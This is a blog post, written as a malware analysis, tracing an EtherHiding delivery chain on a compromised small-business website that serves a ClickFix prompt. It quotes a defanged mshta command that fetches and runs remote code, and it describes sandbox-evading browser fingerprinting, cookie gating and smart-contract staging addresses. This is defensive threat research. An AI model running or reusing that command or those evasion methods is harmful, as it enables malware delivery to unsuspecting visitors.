---
layout: post
title:  "Sosphisticated EtherHiding Infrastructure to Deliver Clickfix Command"
date:   2025-09-16 21:00:00 +1000
categories: malware analysis
---

<style>
  body { font-size: 16px; }
  body {font-family: 'Inter', sans-serif}
  h1 { font-size: 19px !important; }
  h2 { font-size: 17px !important; }
  h3 { font-size: 15px !important; }
</style>

## Overview

Ether Hiding used to deliver a Clickfix payload on a compromised website.

Straight away I can tell this is a good one. If I open the website twice in the same browser, it won't display the Clickfix prompt. I even tried rotating IPs. So we likely have some browser fingerprinting going on here in the background.

A mshta payload! Heavily obfuscated jargon in the staging malware! Calls to multiple smart contracts! Alright no more spoilers, buckle in, this one hurts the head a bit.

### Payload

Here we go. Another day another Clickfix prompt.

![alt text](/images/payload_clickfix.PNG) 

Payload copied to is 
``mshta hXXps://gb[.]kaq51[.]ru/m54tdry4``

Interesting it's using mshta. Have not seen this before in Clickfix attack. Mshta is used to execute HTML HTA script code. Which allows for the execution of VBscript and JScript code on the host.

### Ether Hiding?

When inspecting the sources in dev tools, nothing really sticks out, at all. Usually it'd pop out at me. But nope.

![alt text](/images/imageswebsite_sources.PNG)

However, we can see this source. Which is interesting, not sure why it displays as (no domain).

When I inspect this source we have some obfuscated .js

What you can see below is index-based string obfuscation. 

![alt text](/images/js_unob.PNG)

I'm not even going to try to decode that myself. Fudge that.

There are tonnes of js obfuscaters online for free. Main reason these exist are, well one for malware and two so developers aren't getting there code re-used/re-purposed all the time.

Anyhow, I tried whacking it into a few free de-obfuscators with no luck.....

So, lord GPT got it done easy peasy. 

![alt text](/images/deob_js.PNG)

This is what we are looking for. 

Couple of parameters passed in. That looks like our smart contract. Stored in the constant ``payload``

We can also see required headers for a HTTP fetch request such as ``Content-Type`` and ``Accept``. Stored in the constant ``res`` along with our URL bsc-testnet[.]bnbchain[.]org?

Lastly we have some further obfuscation and parsing techniques to avoid detection. This is applied to the response from the data stored in the smart contract to deobfuscate it into JS that can be ran by the browser.

Okay all that is great, but where is the payload actually fetched from?

The payload is fetched from the smart contract named ``0xA1decFB75C8C0CA28C10517ce56B710baf727d2e``

For context bsc-testnet[.]bnbchain[.]org isn't actually on the blockchain. It is essentially a testnet that simulates the blockchain.

Soooo... That means we can just go straight to there and have a look at what data is stored in this smart contract!

![alt text](/images/fetch_bnb.PNG)

I was half hoping for ``mshta hXXps://gb[.]kaq51[.]ru/m54tdry4`` but it is never that easy.

What we have is the data stored in the smart contract, obfuscated.

We also have some interesting pivot points such as the "contract creator", perhaps we have a look into that later to see if we can discover some more compromised websites. Hypothetically, if we know the obfuscation method and smart contract addresses, we should be able to google dork it. I will return to this. This could be epic.

Anyhow, we have our payload, but it's obfuscated. But we know the obfuscation method. We observed that above during the analysis on the .JS found on the page. 

So let's apply the same logic that we observed to the data in the smart contract, using of course, Lord GPT.

![alt text](/images/js_response.PNG)

First function looks to be another function to ping out to a new smart contract. Deobfuscation method looks to be the same as earlier. That makes it easier for LordGPT!

![alt text](/images/browser_fingerprinting.PNG)

Yes! Epic. Browser fingerprinting. 

Constant ``isHeadless`` checks for the User Agents "Playwright", "Puppeteer" and "PhantomJS". But also checks screen width and height to see if it is running headless (no GUI)

Constant ``isLikelyNormalBrowser`` checks whether plugins are installed and if browser reports different languages.

They have a cool little boolean as well. If more than any of these checks are true, they don't run the function ``IsLikelyNormalBrowser`` and instead....

![alt text](/images/headless.PNG)

Leave us a lovely message and smiley face. 

This is all fine and dandy, but doesn't answer my earlier question as to why it wouldn't prompt me for a payload twice. Even after changing IPs. Maybe that is yet to come.

Anyhow further down we can see two constants ``isWindows`` and ``isMac``. And even further down we can see two more smart contract addresses, one for each OS!

Pretty cool to see the different payloads, have not seen this before. I am itching to see what malware this is! 

I will note the smart contract addresses here for OSINT later!
- 0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff (Windows)
- 0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5 (MAC)

Okay, using the same script as before I'm going to dump the next blob of obfuscated jargon stored in the new smart contract addresses.

Lets start with the response we got for Windows, we have 130 lines of JS unobfuscated thanks to LordGPT.

![alt text](/images/first_response.PNG)

Classic, same function as before. Rather be safe than sorry I guess. Any how will skip through this.

![alt text](/images/i_knew_it.PNG)

Yes! This is epic. What we have here is the .JS creating a cookie for our browser. Therefore, if a cookie exists. The clickfix prompt will not be displayed to us! This all makes sense now. 

Just went back into my VM, cleared the cookie and badda bing badda boom. We have a prompt again.

![alt text](/images/again.PNG)

Another function to make a fetch request to a smart contract. But a new one, the chain keeps on going. Again, I'll note the address:
- 0xf4a32588b50a59a82fbA148d436081A48d80832A (Windows and MAC)

And likewise earlier, decodes the response using the same flow that LordGPT knows off by heart now.

![alt text](/images/last.PNG)

Lastly, we have a function that creates a hidden container to store the malicious HTML and JS in as B64 and run it. We have this same functionality for MAC except slightly different. That is the only difference between the MAC and Windows JS response.

Both the Windows and MAC response had the same smart contract address for the next payload.

Okay surely... We are getting close. Time to run that lordy script again from LordGPT. Lord GPT just had a heart attack. 

After about an hour I understand what is wrong to a degree. The JS is creating a unique UUID per browser stored in the cookie variable ``cjs_id``. So... If you fail any of the previous browser fingerprinting challenges such as ``IsHeadless`` your UUID is associated with a fail, therefore, we don't get the payload. 

![alt text](/images/cookie.PNG)

So... to try and fix this, I booted up browserling loaded the website and navigated to Dev Tools --> Application --> Cookies and pinched the value for ``cjs_id``, I then parsed this value into my python script.

However, this still wasn't giving me results. Why? Because the smart contract is stateful, meaning it tracks what UUIDs have been used. So when I copy and paste a UUID from my sandbox to my script, it has already been used and set. So it doesn't work.

I need to somehow cut off the request before the UUID is used.

I am leaving this for now, will have to circle back.

At the moment we know the following:
- Highly obfuscated and extremely epic
- Sophisticated browser fingerprinting
- Multiple smart contracts used in delivery chain

### How/why did it get there?

The compromised website is owned by a small business in Australia. But, they look to not manage it.

They've outsourced to an group of indian web developers posing as an Australian business entity.

This is super common for web development and SEO based services. An international person has a relative/friend in Australia who registers the business with a valid ABN. Allowing them to legally operate in Australia and own a .au domain.

![alt text](/images/osint_digital.PNG) 

As you can see the business has advertised themselves at the bottom of the page. As you can see above.

Luckily for us. This is google dorkable. Attackers can also use this to determine how many and what websites the web development business manage.

I performed a search for the header at the end of the HTML content.

After sandboxing about 25 other websites managed by the same web development business I cannot see any signs of clickfix payload delivery, also no calls to weird domains. Which is awesome.

I've read a lot about threat actors targeting web developers. Because why compromise one website when you can compromise 30 by popping one account?

### Who's that Pokemon! (Threat Actor)

So... OSINT/Threat Intel/Attribution time.

We have the following eth smart contracts attributed to the this clickfix delivery infrastructure:
- 0xA1decFB75C8C0CA28C10517ce56B710baf727d2e
- 0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff (Windows)
- 0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5 (MAC)
- 0xf4a32588b50a59a82fbA148d436081A48d80832A (Windows and MAC)

Problem with the smart contracts is there are no artefacts we can bounce off. Sure, it shows us different JS pushed to the site but it doesn't have any pivotable information in it. 

However, I can google dork the smart contract names and see if there is any previous analysis done on it.

Wow found this fantastic writeup. LinkedIn is usually a cestpool, but this is actually great. [Swisscom EtherHiding Acreed Writeup](https://www.linkedin.com/posts/teethador_tdr-threat-brief-acreed-activity-7384201370855165952-vHAW/)

The writeup above references this as well. Which touches moreso on the malware side of things, rather than the infrastructure. [IntrinSec Acreed Infostealer Writeup](https://www.intrinsec.com/wp-content/uploads/2025/10/TLP-CLEAR-Sept-2025-Acreed-infostealer-EN.pdf) 

Interestingly, no indication of how many websites have been comp'd or any real attribution. However, what we can see is that the threat actors are using the same infrastructure, and not new smart contract addresses. This is kind of lazy, these reports came out in September and now late October the same infra is being used.

I'm keen on determining the scale of how many websites are deploying Ether Hiding to deliver Acreed. Will be tough as the JS inject method is not very dorkable.

In terms of page content the script is directly whacked into the HTML as B64.
![alt text](/images/script_inject.PNG)

This may be useful as B64 is deterministic. What this is doing is saying hey HTML run this JS script, but first decode it from B64. So, search engines will index the B64 content before it's decoded. So therefore, when I decode the B64 I get the raw JS with the string obfuscation we observed earlier. But in that response I can see the first smart contract that the website pinged out to. So if I re-encode that with B64 I can google dork it and hopefully find other compromised websites!

So our smart contract ``0xA1decFB75C8C0CA28C10517ce56B710baf727d2e`` encoded to b64 is ``MHhBMWRlY0ZCNzVDOEMwQ0EyOEMxMDUxN2NlNTZCNzEwYmFmNzI3ZDJl``.

However, when we dork this we can some threat intel reports. But, no compromised websites.

Soooo apparently when indexing google does not index base64 payloads embedded in the format we observed ``<script src="data:text/javascript;base64">``. So dead end on this one.